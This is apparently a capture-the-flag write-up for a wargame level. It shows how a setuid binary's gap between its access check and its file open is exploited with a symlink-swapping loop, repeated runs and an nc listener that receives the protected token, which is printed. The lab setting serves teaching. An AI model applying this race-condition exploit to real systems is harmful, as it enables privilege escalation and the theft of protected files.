# We have again and again, ./level10 (group level10) and token (group flag10)

./level10
> ./level10 file host
>	sends file to host if you have access to it

# strings level10

%s file host
	sends file to host if you have access to it
Connecting to %s:6969 ..
Unable to connect to host %s
.*( )*.
Unable to write banner to host %s
Connected!
Sending file ..
Damn. Unable to open file
Unable to read from file: %s
wrote file!
You don't have access to %s
;*2$"

# We use nm to check the lists the symbols (-u for Display only undefined symbols)

w _Jv_RegisterClasses
U __errno_location@@GLIBC_2.0
w __gmon_start__
U __libc_start_main@@GLIBC_2.0
U __stack_chk_fail@@GLIBC_2.4
U access@@GLIBC_2.0 <------   ...?
U connect@@GLIBC_2.0
U exit@@GLIBC_2.0
U fflush@@GLIBC_2.0
U htons@@GLIBC_2.0
U inet_addr@@GLIBC_2.0
U open@@GLIBC_2.0 <------   Shit ton append between access and open ...?
U printf@@GLIBC_2.0
U puts@@GLIBC_2.0
U read@@GLIBC_2.0
U socket@@GLIBC_2.0
U strerror@@GLIBC_2.0
U write@@GLIBC_2.0

# Maybe we can trick it, to autorize read and swap the file ? Symbolic link like the other exercice ? Maybe ...?
# So let's trick it, we create to file /tmp/trash && /tmp/swap

while true; do ln -fs /tmp/trash /tmp/swap; ln -fs ~/token /tmp/swap; done # Perma switch to try having a timing

# Then we will call `level10` in a loop and listen port 6969 at the same time
while true; do ./level10 /tmp/swap <HOST>; done # Tell you if you have access or not
nc -lk 6969 # Give the content of file read on the port
.*( )*.
---------------- # /tmp/trash
.*( )*.
woupa2yuojeeaaed06riuj63c # ~/token
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
woupa2yuojeeaaed06riuj63c
.*( )*.
----------------
.*( )*.
woupa2yuojeeaaed06riuj63c

GETFLAG
